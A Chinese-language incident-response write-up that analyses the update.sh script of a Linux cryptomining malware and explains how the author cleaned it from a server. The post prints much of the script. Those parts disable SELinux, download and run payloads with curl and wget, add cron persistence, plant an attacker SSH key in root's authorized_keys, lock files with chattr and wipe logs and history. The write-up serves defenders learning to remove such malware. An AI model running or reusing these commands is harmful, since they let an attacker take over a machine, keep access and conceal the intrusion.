## 序

这是第二次遇到该挖矿病毒，网上也有很多大佬对该病毒做过分析，也想过再写可能没有什么意义，最终还是想写一写属于自己的东西，也算是两次相遇的总结。

## 背景

这次废话不多说，直接上，背景感觉毫无意义。

## 分析

### 现象确认

首先确认现象，通过查看系统进程发现存在CPU占用过高的现象，如下图：

![1601614426_5f76b25a7e98d2c6c5713.png!small](https://image.3001.net/images/20201002/1601614426_5f76b25a7e98d2c6c5713.png!small)

查看进程信息：

![1601614436_5f76b264d76154e5ac23e.png!small](https://image.3001.net/images/20201002/1601614436_5f76b264d76154e5ac23e.png!small)

进程关联查看，发现该病毒启动时间是在2020.09.18 10:00:01。

![1601614442_5f76b26a15fcd177d863f.png!small](https://image.3001.net/images/20201002/1601614442_5f76b26a15fcd177d863f.png!small)

### update.sh脚本分析

通过对程序进行分析，发现该病毒程序同路径下存在update.sh文件（/etc/update.sh），通过对该文件进行分析，发现该文件为挖矿病毒执行的脚本文件，因此对该脚本文件进行分析。

![1601614450_5f76b272dc9c4f27b83b0.png!small](https://image.3001.net/images/20201002/1601614450_5f76b272dc9c4f27b83b0.png!small)

 **定义系统变量**

关闭selinux防火墙，隐藏输出的错误信息，如果有错误信息就输出到空设备2>/dev/null空设备：

    
    
    setenforce 0 2>dev/null

关闭selinux：

    
    
    echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null

把内容同步写入磁盘

    
    
    sync && echo 3 >/proc/sys/vm/drop_caches

设置变量：

    
    
    crondir='/var/spool/cron/'"$USER"
    
    cont=`cat ${crondir}`

查看ssh公钥信息

    
    
    ssht=`cat /root/.ssh/authorized_keys`   #ssht = cat /root/.ssh/authorized_keys

关闭相关病毒程序

使用ps auxf查看所有进程，并针对kinsiing进行查找，awk是tab分割，print $2是取出第二个单词，ps
auxf查看进程中第二单词为PID（这里关闭的进程较多，只列举其中一些）：

    
    
    ps auxf|grep kinsing| awk '{print $2}'|xargs kill -9
    
    ps auxf|grep kdevtmpfsi| awk '{print $2}'|xargs kill -9
    
    ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
    
    netstat -anp | grep 185.71.65.238 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %

seliunx探测，检查是否关闭

    
    
    if [ -f "/usr/bin/curl" ]
    
    then
    
    echo $1,$2
    
    http_code=`curl -I -m 10 -o /dev/null -s -w %{http_code} $1`
    
    if [ "$http_code" -eq "200" ]
    
    then
    
    curl --connect-timeout 10 --retry 100 $1 > $2
    
    elif [ "$http_code" -eq "405" ]
    
    then
    
    curl --connect-timeout 10 --retry 100 $1 > $2
    
    else
    
    curl --connect-timeout 10 --retry 100 $3 > $2
    
    fi
    
    elif [ -f "/usr/bin/cur" ]
    
    then
    
    http_code = `cur -I -m 10 -o /dev/null -s -w %{http_code} $1`
    
    if [ "$http_code" -eq "200" ]
    
    then
    
    cur --connect-timeout 10 --retry 100 $1 > $2
    
    elif [ "$http_code" -eq "405" ]
    
    then
    
    cur --connect-timeout 10 --retry 100 $1 > $2
    
    else
    
    cur --connect-timeout 10 --retry 100 $3 > $2
    
    fi
    
    elif [ -f "/usr/bin/wget" ]
    
    then
    
    wget --timeout=10 --tries=100 -O $2 $1
    
    if [ $? -ne 0 ]
    
    then
    
    wget --timeout=10 --tries=100 -O $2 $3
    
    fi
    
    elif [ -f "/usr/bin/wge" ]
    
    then
    
    wge --timeout=10 --tries=100 -O $2 $1
    
    if [ $? -eq 0 ]
    
    then
    
    wge --timeout=10 --tries=100 -O $2 $3
    
    fi
    
    fi

判断是否运行相同程序的挖矿病毒，如果有则删除

    
    
    ps axf -o "pid"|while read procid    #输出所有pid信息
    
    do
    
    ls -l /proc/$procid/exe | grep /tmp
    
    if [ $? -ne 1 ]
    
    then
    
    cat /proc/$procid/cmdline| grep -a -E "sysguard|update.sh|sysupdate|networkservice"
    
    if [ $? -ne 0 ]
    
    then
    
    kill -9 $procid
    
    else
    
    echo "don't kill"
    
    fi
    
    fi
    
    done
    
    ps axf -o "pid %cpu" | awk '{if($2>=40.0) print $1}' | while read procid   #查找所有PID中cpu大于40的
    
    do
    
    cat /proc/$procid/cmdline| grep -a -E "sysguard|update.sh|sysupdate|networkservice"
    
    if [ $? -ne 0 ]    #$？取上一个执行命令的状态，成功返回0，错误返回其他字符 -ne
    
    then
    
    kill -9 $procid
    
    else
    
    echo "don't kill"
    
    fi
    
    done

解锁操作

    
    
    chattr -R -i /var/spool/cron #-R递归处理，解锁/var/spool/cron目录下的所有文件及子目录
    
    chattr -i /etc/crontab

对文件进行加锁

    
    
    chattr -R +i /var/spool/cron
    
    chattr +i /etc/crontab

挖矿病毒相关执行

解锁文件

    
    
    echo "i am root"
    
    echo "goto 1" >> /etc/sysupdates
    
    chattr -i /etc/sysupdate*
    
    chattr -i /etc/config.json*
    
    chattr -i /etc/update.sh*
    
    chattr -i /root/.ssh/authorized_keys*
    
    chattr -i /etc/networkservice

启动项配置：

    
    
    then
    
    unlock_cron  #调用解锁
    
    echo "*/30 * * * * sh /etc/update.sh >/dev/null 2>&1" >> ${crondir}
    
    lock_cron  #加锁
    
    else
    
    unlock_cron
    
    [[ $cont =~ "update.sh" ]] || (crontab -l ; echo "*/30 * * * * sh /etc/update.sh >/dev/null 2>&1") | crontab -    
    lock_cron

配置SSH，用于登录

    
    
    chmod 700 /root/.ssh/
    
    echo >> /root/.ssh/authorized_keys
    
    chmod 600 root/.ssh/authorized_keys
    
    echo "ssh-rsa xxx root@u17" >> /root/.ssh/authorized_keys  #写入公钥文件

依次对/etc/config.json|sysupdate|sysguard的文件大小，并对对应文件进行下载：

    
    
    filesize_config=`ls -l /etc/config.json | awk '{ print $5 }'`
    
    if [ "$filesize_config" -ne "$config_size" ]
    
    then
    
    pkill -f sysupdate
    
    rm /etc/config.json
    
    downloads $config_url /etc/config.json $config_url_backup
    
    else
    
    echo "no need download"

下载update.sh

    
    
    downloads $sh_url /etc/update.sh $sh_url_backup

对/etc/networkservice文件大小进行比较，并下载对应文件：

    
    
    if [ -f "/etc/networkservice" ]  #对/etc/networkservice文件大小进行比较
    
    then
    
    filesize2=`ls -l /etc/networkservice | awk '{ print $5 }'`
    
    if [ "$filesize2" -ne "$scan_size" ]
    
    then
    
    pkill -f networkservice
    
    rm /etc/networkservice
    
    downloads  $scan_url /etc/networkservice $scan_url_backup
    
    else
    
    echo "not need download"
    
    fi
    
    else
    
    downloads $scan_url /etc/networkservice $scan_url_backup

对sysupdate|networkservice|sysguard分别进行提权，并对执行的程序进行判定，是否为root执行，并再次执行，如下：

提权

    
    
    chmod 777 /etc/sysupdate

判断是否为root，并运行程序

    
    
    if [ $? -ne 0 ]
    
    then
    
    cd /etc
    
    echo "not root runing"
    
    sleep 5s
    
    ./sysupdate &
    
    else
    
    echo "root runing....."
    
    fi

再对/etc/下的病毒文件进行加锁，并对/tmp/路径下的病毒文件进行解锁，如下：、

    
    
    chmod 777 /etc/sysupdate
    
    chattr +i /etc/sysupdate
    
    chmod 777 /etc/networkservice
    
    chattr +i /etc/networkservice
    
    chmod 777 /etc/config.json
    
    chattr +i /etc/config.json
    
    chmod 777 /etc/update.sh
    
    chattr +i /etc/update.sh
    
    chmod 777 /root/.ssh/authorized_keys
    
    chattr +i /root/.ssh/authorized_keys
    
    else
    
    echo "goto 1" > /tmp/sysupdates
    
    chattr -i /tmp/sysupdate*
    
    chattr -i /tmp/networkservice
    
    chattr -i /tmp/config.json*
    
    chattr -i /tmp/update.sh*

相关解锁动作完成后会在tmp路径再次进行etc路径下的操作，操作完成后，会在此对tmp路径下的病毒文件进行加锁操作，这里不在列举，可参照上述信息。

痕迹擦除

完成上述操作后会删除已有规则，并新建相关规则，清除历史命令操作和清除相关日志信息，如下：

    
    
    iptables -F  #清除预设表filter中的所有规则链的规则
    
    iptables -X  #清除预设表filter中使用者自定链中的规则
    
    iptables -A OUTPUT -p tcp --dport 3333 -j DROP  # -A:添加到规则末尾 -p:协议 --dport：目标端口 -j：匹配规则  DROP：丢弃
    
    iptables -A OUTPUT -p tcp --dport 5555 -j DROP
    
    iptables -A OUTPUT -p tcp --dport 7777 -j DROP
    
    iptables -A OUTPUT -p tcp --dport 9999 -j DROP
    
    iptables -I INPUT -s 43.245.222.57 -j DROP #-I：添加到指定位置 INPUT：进入 -s：源端IP地址
    
    service iptables reload  #重启iptables
    
    ps auxf|grep -v grep|grep "stratum"|awk '{print $2}'|xargs kill -9
    
    history -c  #清理历史命令
    
    echo > /var/spool/mail/root
    
    echo > /var/log/wtmp
    
    echo > /var/log/secure
    
    echo > /root/.bash_history

上述为update.sh脚本的相关操作，通过对脚本进行分析，可以发现该挖矿病毒主要依赖进程和启动项信息，借此可以对该病毒进行清理。

# 处置

### 文件确认

/etc目录文件发现sysupdate、sguard等文件![1601614490_5f76b29acd8d7655d2391.png!small](https://image.3001.net/images/20201002/1601614490_5f76b29acd8d7655d2391.png!small)

/tmp路径未发现文件

![1601614502_5f76b2a699795bc7efd09.png!small](https://image.3001.net/images/20201002/1601614502_5f76b2a699795bc7efd09.png!small)

### 启动项确认

通过对启动项进行查看，未发现启动项信息，如下：

![1601614520_5f76b2b8c4c48ed28b9e4.png!small](https://image.3001.net/images/20201002/1601614520_5f76b2b8c4c48ed28b9e4.png!small)

### 病毒清理

通过上述分析，已明确相关信息，因此进行病毒清理。

 **关闭进程**

通过查看进程信息，关闭所有与病毒相关进程：

![1601614544_5f76b2d0eebfccb6030c3.png!small](https://image.3001.net/images/20201002/1601614544_5f76b2d0eebfccb6030c3.png!small)

 **删除病毒文件**

无法直接删除文件：

![1601614556_5f76b2dcdc86095473313.png!small](https://image.3001.net/images/20201002/1601614556_5f76b2dcdc86095473313.png!small)

因此需要解锁文件属性：

![1601614563_5f76b2e3d20ff8f1c9c2d.png!small](https://image.3001.net/images/20201002/1601614563_5f76b2e3d20ff8f1c9c2d.png!small)

删除文件，并查看是否存在异常文件,通过查看，发现异常文件已清理：

![1601614570_5f76b2ea698e7446aea9f.png!small](https://image.3001.net/images/20201002/1601614570_5f76b2ea698e7446aea9f.png!small)

 **系统恢复**

通过删除相关文件，完成对病毒清理，系统恢复：

![1601614577_5f76b2f1610c98beb8038.png!small](https://image.3001.net/images/20201002/1601614577_5f76b2f1610c98beb8038.png!small)

## 命令汇总

 **命令**

|

 **命令用途**  
  
---|---  
  
ps -aux  
top

|

查看系统进程信息  
  
systemctl status [pid]

|

关联信息查看  
  
Ls -l /proc/pid/exe

|

进程信息查看  
  
crontab -r

|

启动项信息查看  
  
Netsata -anpt

|

网络连接信息查看  
  
rm -rf

|

删除  
  
## 总结

该脚本分析的意义在于可以快速定位到相关文件进行处置，对应急不熟悉linux系统命令的小伙伴在对病毒清理时，不知道那些是病毒文件，那些正常文件，对此无从下手。上述我将应急过程中最实用的命令列举如上。由于在日常生活中，使用桌面操作较多，因此对命令行使用不熟悉，找不到相关文件，因此对linux系统挖矿病毒清理较为恐惧，希望通过对脚本分析这种方式对刚入门的小伙伴有所帮助。

